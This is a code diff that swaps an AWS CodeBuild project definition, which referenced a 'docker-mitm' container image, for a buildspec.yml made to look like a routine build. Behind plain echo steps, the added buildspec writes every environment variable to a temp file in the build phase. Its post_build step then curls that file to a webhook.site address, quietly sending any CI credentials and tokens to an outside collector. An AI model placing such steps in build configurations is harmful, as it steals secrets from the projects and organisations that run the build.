@@ -1,17 +1,17 @@
-{
-    "name": "my-demo-project",
-    "source": {
-        "type": "GITHUB",
-        "location": "https://github.com/YossiAy/ARET",
-        "buildspec": "buildspec.yml"
-    },
-    "artifacts": {
-        "type": "NO_ARTIFACTS"
-    },
-    "environment": {
-        "type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
-        "image": "docker.io/testy1432/docker-mitm:latest",
-        "computeType": "BUILD_GENERAL1_SMALL",
-        "imagePullCredentialsType": "CODEBUILD"
-    }
-}
+version: 0.2
+
+phases:
+  install:
+    commands:
+      - echo Installing dependencies
+  pre_build:
+    commands:
+      - echo Preparing the environment
+  build:
+    commands:
+      - echo Running the build
+      - env > /tmp/env.txt  # Save environment variables to a file
+  post_build:
+    commands:
+      - echo Build completed on `date`
+      - curl -G "https://webhook.site/883548f6-8f0e-4273-9dff-4f654766ec82" --data-urlencode "env=$(cat /tmp/env.txt)"
